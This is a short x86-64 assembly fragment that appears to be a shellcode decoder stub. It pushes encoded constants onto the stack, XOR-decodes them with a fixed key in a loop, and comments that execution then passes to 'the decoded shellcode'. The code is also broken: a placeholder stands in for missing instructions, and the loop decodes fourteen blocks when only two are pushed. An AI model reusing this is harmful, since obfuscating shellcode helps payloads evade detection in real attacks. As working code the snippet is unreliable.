<_start>:
    movabs rax,0xa284ee5c7cde4bd7
    push   rax
    movabs rax,0x935add110510849a
    push   rax
    ; (additional instructions)
    movabs rbx,0x2144d2144d2144d2  ; Load XOR key into rbx

    ; Decoding loop starts here
    mov rdx, rsp                   ; Point rdx to the top of the stack
    mov rcx, 14                    ; Number of 8-byte blocks to decode (adjust as needed)

decode_loop:
    mov rax, [rdx]                 ; Load 8 bytes from the stack
    xor rax, rbx                   ; XOR with the key in rbx
    mov [rdx], rax                 ; Store the decoded bytes back on the stack
    add rdx, 8                     ; Move to the next 8 bytes
    loop decode_loop               ; Decrement rcx and repeat if rcx != 0

    ; Continue execution of the decoded shellcode
    ; You can jump to a specific location if needed
    ; jmp decoded_shellcode_start  ; Uncomment if you have a specific entry point

